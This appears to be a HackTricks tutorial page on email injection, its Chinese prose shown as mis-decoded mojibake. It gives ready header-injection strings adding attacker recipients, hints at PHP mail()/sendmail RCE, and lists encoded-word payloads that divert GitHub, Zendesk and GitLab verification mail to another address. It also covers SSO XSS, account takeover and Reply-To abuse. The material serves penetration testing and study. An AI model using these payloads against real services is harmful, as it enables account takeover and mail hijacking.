# Email Injections

{{#include ../banners/hacktricks-training.md}}

## æ³¨å…¥å·²å‘é€çš„ç”µå­é‚®ä»¶

### åœ¨å‘ä»¶äººå‚æ•°åæ³¨å…¥ Cc å’Œ Bcc
```
From:sender@domain.com%0ACc:recipient@domain.co,%0ABcc:recipient1@domain.com
```
æ¶ˆæ¯å°†è¢«å‘é€åˆ°æ”¶ä»¶äººå’Œrecipient1è´¦æˆ·ã€‚

### æ³¨å…¥å‚æ•°
```
From:sender@domain.com%0ATo:attacker@domain.com
```
æ¶ˆæ¯å°†å‘é€åˆ°åŸå§‹æ”¶ä»¶äººå’Œæ”»å‡»è€…è´¦æˆ·ã€‚

### æ³¨å…¥ä¸»é¢˜å‚æ•°
```
From:sender@domain.com%0ASubject:This is%20Fake%20Subject
```
å‡ä¸»é¢˜å°†è¢«æ·»åŠ åˆ°åŸå§‹ä¸»é¢˜ä¸­ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å°†æ›¿æ¢å®ƒã€‚è¿™å–å†³äºé‚®ä»¶æœåŠ¡çš„è¡Œä¸ºã€‚

### æ›´æ”¹æ¶ˆæ¯æ­£æ–‡

æ³¨å…¥ä¸¤ä¸ªæ¢è¡Œç¬¦ï¼Œç„¶åå†™ä¸‹æ‚¨çš„æ¶ˆæ¯ä»¥æ›´æ”¹æ¶ˆæ¯çš„æ­£æ–‡ã€‚
```
From:sender@domain.com%0A%0AMy%20New%20%0Fake%20Message.
```
### PHP mail() å‡½æ•°åˆ©ç”¨
```bash
# The function has the following definition:

php --rf mail

Function [ <internal:standard> function mail ] {
- Parameters [5] {
Parameter #0 [ <required> $to ]
Parameter #1 [ <required> $subject ]
Parameter #2 [ <required> $message ]
Parameter #3 [ <optional> $additional_headers ]
Parameter #4 [ <optional> $additional_parameters ]
}
}
```
#### ç¬¬äº”ä¸ªå‚æ•° ($additional_parameters)

æœ¬èŠ‚å°†åŸºäº**å‡è®¾æ”»å‡»è€…æ§åˆ¶æ­¤å‚æ•°çš„æƒ…å†µä¸‹å¦‚ä½•æ»¥ç”¨æ­¤å‚æ•°**ã€‚

æ­¤å‚æ•°å°†è¢«æ·»åŠ åˆ° PHP ç”¨äºè°ƒç”¨äºŒè¿›åˆ¶ sendmail çš„å‘½ä»¤è¡Œä¸­ã€‚ç„¶è€Œï¼Œå®ƒå°†é€šè¿‡å‡½æ•° `escapeshellcmd($additional_parameters)` è¿›è¡Œæ¸…ç†ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥**æ³¨å…¥ sendmail çš„æå–å‚æ•°**ã€‚

#### /usr/sbin/sendmail å®ç°çš„å·®å¼‚

**sendmail** æ¥å£æ˜¯ç”±ç³»ç»Ÿä¸Šå®‰è£…çš„ **MTA é‚®ä»¶è½¯ä»¶**ï¼ˆSendmailã€Postfixã€Exim ç­‰ï¼‰æä¾›çš„ã€‚å°½ç®¡å‡ºäºå…¼å®¹æ€§åŸå› ï¼Œ**åŸºæœ¬åŠŸèƒ½**ï¼ˆå¦‚ -t -i -f å‚æ•°ï¼‰ä¿æŒ**ç›¸åŒ**ï¼Œä½†**å…¶ä»–åŠŸèƒ½å’Œå‚æ•°**æ ¹æ®å®‰è£…çš„ MTA æœ‰å¾ˆå¤§å·®å¼‚ã€‚

ä»¥ä¸‹æ˜¯ sendmail å‘½ä»¤/æ¥å£çš„ä¸åŒæ‰‹å†Œé¡µçš„ä¸€äº›ç¤ºä¾‹ï¼š

- Sendmail MTA: http://www.sendmail.org/\~ca/email/man/sendmail.html
- Postfix MTA: http://www.postfix.org/mailq.1.html
- Exim MTA: https://linux.die.net/man/8/eximReferences

æ ¹æ®**sendmail** äºŒè¿›åˆ¶æ–‡ä»¶çš„æ¥æºï¼Œå‘ç°äº†ä¸åŒçš„é€‰é¡¹æ¥æ»¥ç”¨å®ƒä»¬å¹¶**æ³„éœ²æ–‡ä»¶æˆ–ç”šè‡³æ‰§è¡Œä»»æ„å‘½ä»¤**ã€‚æŸ¥çœ‹å¦‚ä½•åœ¨ [**https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html**](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

## åœ¨ç”µå­é‚®ä»¶åç§°ä¸­æ³¨å…¥

> [!CAUTION]
> è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨è®¾æ³•åœ¨å…·æœ‰ä»»æ„åŸŸåçš„æœåŠ¡ä¸­åˆ›å»ºå¸æˆ·ï¼ˆå¦‚ Githubã€Gitlabã€CloudFlare Zero trust...ï¼‰å¹¶é€šè¿‡åœ¨æ‚¨çš„é‚®ä»¶åœ°å€ä¸­æ¥æ”¶éªŒè¯ç”µå­é‚®ä»¶æ¥éªŒè¯å®ƒï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿè®¿é—®å—å®³å…¬å¸æ•æ„Ÿä½ç½®ã€‚

### è¢«å¿½ç•¥çš„ç”µå­é‚®ä»¶éƒ¨åˆ†

ç¬¦å·ï¼š**+ã€-** å’Œ **{}** åœ¨å°‘æ•°æƒ…å†µä¸‹å¯ä»¥ç”¨äºæ ‡è®°ï¼Œå¹¶è¢«å¤§å¤šæ•°ç”µå­é‚®ä»¶æœåŠ¡å™¨å¿½ç•¥ã€‚

- ä¾‹å¦‚ï¼Œjohn.doe+intigriti@example.com â†’ john.doe@example.com

**æ‹¬å· () ä¸­çš„æ³¨é‡Š** åœ¨å¼€å¤´æˆ–ç»“å°¾ä¹Ÿä¼šè¢«å¿½ç•¥ã€‚

- ä¾‹å¦‚ï¼Œjohn.doe(intigriti)@example.com â†’ john.doe@example.com

### ç™½åå•ç»•è¿‡

<figure><img src="../images/image (812).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### å¼•å·

<figure><img src="../images/image (626).png" alt="https://www.youtube.com/watch?app=desktop&#x26;v=4ZsTKvfP1g0"><figcaption></figcaption></figure>

### IP

æ‚¨è¿˜å¯ä»¥ä½¿ç”¨æ–¹æ‹¬å·ä¸­çš„ IP ä½œä¸ºåŸŸåï¼š

- john.doe@\[127.0.0.1]
- john.doe@\[IPv6:2001:db8::1]

### ç”µå­é‚®ä»¶ç¼–ç 

å¦‚ [**æœ¬ç ”ç©¶**](https://portswigger.net/research/splitting-the-email-atom) ä¸­æ‰€è¿°ï¼Œç”µå­é‚®ä»¶åç§°ä¹Ÿå¯ä»¥åŒ…å«ç¼–ç å­—ç¬¦ï¼š

- **PHP 256 æº¢å‡º**ï¼šPHP `chr` å‡½æ•°å°†ç»§ç»­å‘å­—ç¬¦æ·»åŠ  256ï¼Œç›´åˆ°å˜ä¸ºæ­£æ•°ï¼Œç„¶åè¿›è¡Œæ“ä½œ `%256`ã€‚
- `String.fromCodePoint(0x10000 + 0x40) // ğ€ â†’ @`

> [!TIP]
> æ­¤æŠ€å·§çš„ç›®çš„æ˜¯ä»¥ `RCPT TO:<"collab@psres.net>collab"@example.com>` ç»“æŸæ³¨å…¥\
> è¿™å°†æŠŠéªŒè¯ç”µå­é‚®ä»¶å‘é€åˆ°ä¸é¢„æœŸä¸åŒçš„ç”µå­é‚®ä»¶åœ°å€ï¼ˆå› æ­¤åœ¨ç”µå­é‚®ä»¶åç§°ä¸­å¼•å…¥å¦ä¸€ä¸ªç”µå­é‚®ä»¶åœ°å€å¹¶åœ¨å‘é€ç”µå­é‚®ä»¶æ—¶ç ´åè¯­æ³•ï¼‰ã€‚

ä¸åŒçš„ç¼–ç ï¼š
```bash
# Format
=? utf-8 ? q ? =41=42=43 ?= hi@example.com --> ABChi@example.com

# =? -> Start of encode
# utf-8 -> encoding used
# ? -> separator
# q -> type of encoding
# ? -> separator
# =41=42=43 -> Hex encoded data
# ?= end of encoding

# Other encodings, same example:
#Â iso-8859-1
=?iso-8859-1?q?=61=62=63?=hi@example.com
# utf-8
=?utf-8?q?=61=62=63?=hi@example.com
# utf-7
=?utf-7?q?<utf-7 encoded string>?=hi@example.com
# q encoding + utf-7
=?utf-7?q?&=41<utf-7 encoded string without initial A>?=hi@example.com
# base64
=?utf-8?b?QUJD?=hi@example.com
# bas64 + utf-7
=?utf-7?q?<utf-7 encoded string in base64>?=hi@example.com
#punycode
x@xn--svg/-9x6 â†’ x@<svg/
```
Payloads:

- Github: `=?x?q?collab=40psres.net=3e=00?=foo@example.com`
- æ³¨æ„ç¼–ç çš„ `@` ä¸º =40ï¼Œç¼–ç çš„ `>` ä¸º `=3e` å’Œ `null` ä¸º `=00`&#x20;
- å®ƒå°†æŠŠéªŒè¯é‚®ä»¶å‘é€åˆ° `collab@psres.net`
- Zendesk: `"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com`
- ä¸ä¹‹å‰ç›¸åŒçš„æŠ€å·§ï¼Œä½†åœ¨å¼€å¤´æ·»åŠ äº†ä¸€äº›å¸¸è§„å¼•å·ï¼Œå¹¶åœ¨ç¼–ç çš„ `@` ä¹‹å‰æ·»åŠ äº†ç¼–ç å¼•å· `=22`ï¼Œç„¶ååœ¨ä¸‹ä¸€ä¸ªç”µå­é‚®ä»¶ä¹‹å‰å¼€å§‹å’Œç»“æŸä¸€äº›å¼•å·ï¼Œä»¥ä¿®å¤ Zendesk å†…éƒ¨ä½¿ç”¨çš„è¯­æ³•
- å®ƒå°†æŠŠéªŒè¯é‚®ä»¶å‘é€åˆ° `collab@psres.net`
- Gitlab: `=?x?q?collab=40psres.net_?=foo@example.com`
- æ³¨æ„ä½¿ç”¨ä¸‹åˆ’çº¿ä½œä¸ºåˆ†éš”åœ°å€çš„ç©ºæ ¼
- å®ƒå°†æŠŠéªŒè¯é‚®ä»¶å‘é€åˆ° `collab@psres.net`
- Punycode: ä½¿ç”¨ Punycode å¯ä»¥åœ¨ Joomla ä¸­æ³¨å…¥ä¸€ä¸ªæ ‡ç­¾ `<style` å¹¶åˆ©ç”¨å®ƒé€šè¿‡ CSS å¤–æ³„çªƒå– CSRF ä»¤ç‰Œã€‚

#### Tooling

- æœ‰ä¸€ä¸ª **Burp Suite Turbo Intruder è„šæœ¬** ç”¨äºæ¨¡ç³Šè¿™äº›ç»„åˆï¼Œä»¥å°è¯•æ”»å‡»ç”µå­é‚®ä»¶æ ¼å¼ã€‚è¯¥è„šæœ¬å·²ç»åŒ…å«äº†æ½œåœ¨çš„æœ‰æ•ˆç»„åˆã€‚
- è¿˜å¯ä»¥ä½¿ç”¨ [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100) åˆ›å»ºç”µå­é‚®ä»¶æ‹†åˆ†æ”»å‡»

### Other vulns

![https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0](<../images/image (1131).png>)

## Third party SSO

### XSS

ä¸€äº›æœåŠ¡ï¼Œå¦‚ **github** æˆ– **salesforce å…è®¸** æ‚¨åˆ›å»ºä¸€ä¸ª **å¸¦æœ‰ XSS è´Ÿè½½çš„ç”µå­é‚®ä»¶åœ°å€**ã€‚å¦‚æœæ‚¨å¯ä»¥ **ä½¿ç”¨è¿™äº›æä¾›å•†ç™»å½•å…¶ä»–æœåŠ¡**ï¼Œè€Œè¿™äº›æœåŠ¡ **æ²¡æœ‰æ­£ç¡®æ¸…ç†** ç”µå­é‚®ä»¶ï¼Œæ‚¨å¯èƒ½ä¼šå¯¼è‡´ **XSS**ã€‚

### Account-Takeover

å¦‚æœ **SSO æœåŠ¡** å…è®¸æ‚¨ **åˆ›å»ºä¸€ä¸ªä¸éªŒè¯ç»™å®šç”µå­é‚®ä»¶åœ°å€çš„å¸æˆ·**ï¼ˆå¦‚ **salesforce**ï¼‰ï¼Œç„¶åæ‚¨å¯ä»¥ä½¿ç”¨è¯¥å¸æˆ· **ç™»å½•åˆ°ä¸€ä¸ªä¿¡ä»»** salesforce çš„ä¸åŒæœåŠ¡ï¼Œæ‚¨å¯èƒ½ä¼šè®¿é—®ä»»ä½•å¸æˆ·ã€‚\
_&#x4E;ote that salesforce indicates if the given email was or not verified but so the application should take into account this info._

## Reply-To

æ‚¨å¯ä»¥ä½¿ç”¨ _**From: company.com**_ å’Œ _**Replay-To: attacker.com**_ å‘é€ç”µå­é‚®ä»¶ï¼Œå¦‚æœç”±äºç”µå­é‚®ä»¶æ˜¯ **ä»** å†…éƒ¨åœ°å€å‘é€çš„è€Œå‘é€äº†ä»»ä½• **è‡ªåŠ¨å›å¤**ï¼Œåˆ™ **æ”»å‡»è€…** å¯èƒ½èƒ½å¤Ÿ **æ¥æ”¶** è¯¥ **å“åº”**ã€‚

## Hard Bounce Rate

æŸäº›æœåŠ¡ï¼Œå¦‚ AWSï¼Œå®æ–½ä¸€ä¸ªç§°ä¸º **Hard Bounce Rate** çš„é˜ˆå€¼ï¼Œé€šå¸¸è®¾ç½®ä¸º 10%ã€‚è¿™æ˜¯ä¸€ä¸ªå…³é”®æŒ‡æ ‡ï¼Œå°¤å…¶å¯¹äºç”µå­é‚®ä»¶æŠ•é€’æœåŠ¡ã€‚å½“è¶…è¿‡æ­¤æ¯”ç‡æ—¶ï¼ŒæœåŠ¡ï¼ˆå¦‚ AWS çš„ç”µå­é‚®ä»¶æœåŠ¡ï¼‰å¯èƒ½ä¼šè¢«æš‚åœæˆ–é˜»æ­¢ã€‚

**hard bounce** æŒ‡çš„æ˜¯ **ç”µå­é‚®ä»¶** è¢«é€€å›ç»™å‘ä»¶äººï¼Œå› ä¸ºæ”¶ä»¶äººçš„åœ°å€æ— æ•ˆæˆ–ä¸å­˜åœ¨ã€‚è¿™å¯èƒ½ç”±äºå¤šç§åŸå› é€ æˆï¼Œä¾‹å¦‚ **ç”µå­é‚®ä»¶** è¢«å‘é€åˆ°ä¸å­˜åœ¨çš„åœ°å€ã€ä¸€ä¸ªä¸çœŸå®çš„åŸŸåï¼Œæˆ–æ”¶ä»¶æœåŠ¡å™¨æ‹’ç»æ¥å— **ç”µå­é‚®ä»¶**ã€‚

åœ¨ AWS çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œå¦‚æœæ‚¨å‘é€ 1000 å°ç”µå­é‚®ä»¶ï¼Œå…¶ä¸­ 100 å°å¯¼è‡´ç¡¬é€€å›ï¼ˆç”±äºæ— æ•ˆåœ°å€æˆ–åŸŸåç­‰åŸå› ï¼‰ï¼Œè¿™å°†æ„å‘³ç€ 10% çš„ç¡¬é€€å›ç‡ã€‚è¾¾åˆ°æˆ–è¶…è¿‡æ­¤æ¯”ç‡å¯èƒ½ä¼šè§¦å‘ AWS SESï¼ˆç®€å•ç”µå­é‚®ä»¶æœåŠ¡ï¼‰é˜»æ­¢æˆ–æš‚åœæ‚¨çš„ç”µå­é‚®ä»¶å‘é€èƒ½åŠ›ã€‚

ä¿æŒä½ç¡¬é€€å›ç‡å¯¹äºç¡®ä¿ä¸é—´æ–­çš„ç”µå­é‚®ä»¶æœåŠ¡å’Œç»´æŠ¤å‘ä»¶äººå£°èª‰è‡³å…³é‡è¦ã€‚ç›‘æ§å’Œç®¡ç†æ‚¨çš„é‚®ä»¶åˆ—è¡¨ä¸­ç”µå­é‚®ä»¶åœ°å€çš„è´¨é‡å¯ä»¥æ˜¾è‘—å¸®åŠ©å®ç°è¿™ä¸€ç›®æ ‡ã€‚

æœ‰å…³æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œå¯ä»¥å‚è€ƒ AWS å…³äºå¤„ç†é€€å›å’ŒæŠ•è¯‰çš„å®˜æ–¹æ–‡æ¡£ [AWS SES Bounce Handling](https://docs.aws.amazon.com/ses/latest/DeveloperGuide/notification-contents.html#bounce-types)ã€‚

## References

- [https://resources.infosecinstitute.com/email-injection/](https://resources.infosecinstitute.com/email-injection/)
- [https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)
- [https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view](https://drive.google.com/file/d/1iKL6wbp3yYwOmxEtAg1jEmuOf8RM8ty9/view)
- [https://www.youtube.com/watch?app=desktop\&v=4ZsTKvfP1g0](https://www.youtube.com/watch?app=desktop&v=4ZsTKvfP1g0)

{{#include ../banners/hacktricks-training.md}}
